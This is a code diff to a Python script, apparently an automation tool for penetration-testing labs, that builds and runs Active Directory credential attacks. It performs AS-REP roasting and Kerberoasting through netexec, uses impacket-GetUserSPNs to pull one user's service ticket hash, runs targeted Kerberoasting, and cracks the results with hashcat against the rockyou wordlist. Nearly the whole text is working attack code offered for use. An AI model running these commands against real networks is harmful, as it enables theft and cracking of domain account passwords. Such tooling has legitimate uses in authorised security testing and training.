@@ -9,9 +9,10 @@ def asreproast(box, path):
     """
     os.chdir(path.ws_atk)
     print('\033[93m[*]\033[0m ASREProast')
-    if box.krb:
-        print(f'\033[91m[!]\033[0m Kerberos Auth not supportet!')
-        exit()
+    if isinstance(box.krb, str):
+        cmd1 = f"{box.krb_ccache} netexec ldap {box.fqdn} --use-kcache --asreproast ASREProastables.txt"
+    elif box.krb:
+        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} -k --asreproast ASREProastables.txt"
     elif box.nt_hash:
         cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -H {box.nt_hash} --asreproast ASREProastables.txt"
     else:
@@ -26,12 +27,12 @@ def asreproast(box, path):
 
 def krbroast(box, path):
     config.required_creds(box)
-    """
-    """
     os.chdir(path.ws_atk)
     print('\033[93m[*]\033[0m Kerberoast')
-    if box.krb:
-        cmd1 = f"{box.krb} netexec ldap {box.fqdn} -u {box.username} --use-kcache --kerberoasting kerberoastables.txt"
+    if isinstance(box.krb, str):
+        cmd1 = f"{box.krb_ccache} netexec ldap {box.fqdn} --use-kcache --kerberoasting kerberoastables.txt"
+    elif box.krb:
+        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} -k --kerberoasting kerberoastables.txt"
     elif box.nt_hash:
         cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -H {box.nt_hash} --kerberoasting kerberoastables.txt"
     else:
@@ -40,6 +41,29 @@ def krbroast(box, path):
     config.log_cmd([cmd1,cmd2])
     print(f'\033[96m[$]\033[0m {cmd1}')
     os.system(cmd1)
+    print(f'\n\033[96m[$]\033[0m {cmd2}')
+    os.system(cmd2)
+    print('\033[92m[+]\033[0m Kerberoast\n')
+
+def krbroast_imp(box, path):
+    config.required_creds(box)
+    config.required_target(box)
+    os.chdir(path.ws_atk)
+    print('\033[93m[*]\033[0m Kerberoast (one user)')
+    if isinstance(box.krb, str):
+        cmd1 = f"{box.krb_ccache} impacket-GetUserSPNs -k -dc-host {box.fqdn} -request-user {box.target} -outputfile {box.target}.hash {box.domain}/"
+    elif box.krb:
+        cmd1 = f"impacket-GetUserSPNs -k -dc-host {box.fqdn} {box.domain}/{box.username}:{box.password} -request-user {box.target} -outputfile {box.target}.hash"
+    elif box.nt_hash:
+        cmd1 = f"impacket-GetUserSPNs -dc-host {box.fqdn} {box.domain}/{box.username} -hashes :{box.nt_hash} -request-user {box.target} -outputfile {box.target}.hash"
+    else:
+        cmd1 = f"impacket-GetUserSPNs -dc-host {box.fqdn} {box.domain}/{box.username}:{box.password} -request-user {box.target} -outputfile {box.target}.hash"
+    cmd2 = f'hashcat -m 13100 {box.target}.hash /usr/share/wordlists/rockyou.txt'
+    config.log_cmd([cmd1,cmd2])
+    print(f'\033[96m[$]\033[0m {cmd1}')
+    os.system(cmd1)
+    print(f'[*] Hash file {box.target}.hash')
+    os.system(f'cat {box.target}.hash')
     print(f'\n\033[96m[$]\033[0m {cmd2}')
     os.system(cmd2)
     print('\033[92m[+]\033[0m Kerberoast\n')
@@ -56,8 +80,10 @@ def target_krbroast(box, path):
     if box.target and box.target != box.username:
         opt = f' --request-user {box.target}'
         target = '-'+box.target
-    if box.krb:
-        cmd1 = f"{box.krb} targetedKerberoast.py -d {box.domain} -u {box.username} -k --no-pass -o targeted_kerberoasting{target}.txt"+opt
+    if isinstance(box.krb, str):
+        cmd1 = f"{box.krb_ccache} targetedKerberoast.py -d {box.domain} -k --no-pass -o targeted_kerberoasting{target}.txt"+opt
+    elif box.krb:
+        cmd1 = f"targetedKerberoast.py -d {box.domain} -u {box.username} -p {box.password} -k -o targeted_kerberoasting{target}.txt"+opt
     elif box.nt_hash:
         cmd1 = f"targetedKerberoast.py -d {box.domain} -u {box.username} -H {box.nt_hash} -o targeted_kerberoasting{target}.txt"+opt
     else:
